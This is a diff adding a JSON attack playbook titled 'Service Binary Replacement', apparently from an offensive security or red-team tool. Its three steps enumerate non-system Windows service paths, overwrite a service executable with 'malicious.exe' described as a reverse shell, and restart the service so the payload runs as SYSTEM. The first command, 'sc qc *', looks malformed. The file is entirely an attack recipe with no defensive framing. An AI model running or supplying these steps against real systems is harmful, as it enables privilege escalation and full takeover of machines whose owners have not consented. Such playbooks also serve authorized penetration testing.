@@ -1,0 +1,25 @@
+{
+	"name": "Service Binary Replacement",
+	"description": "Replace legitimate service executable with malicious payload.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Find Writable Services",
+			"command": "sc qc * | findstr BINARY_PATH_NAME | findstr /i /v system32",
+			"description": "Locate non-system service paths."
+		},
+		{
+			"index": 2,
+			"name": "Replace Binary",
+			"command": "copy malicious.exe \"C:\\Program Files\\VulnService\\service.exe\" /Y",
+			"description": "Overwrite with reverse shell (if writable)."
+		},
+		{
+			"index": 3,
+			"name": "Restart Service",
+			"command": "net stop VulnService && net start VulnService",
+			"description": "Trigger execution as SYSTEM."
+		}
+	]
+}
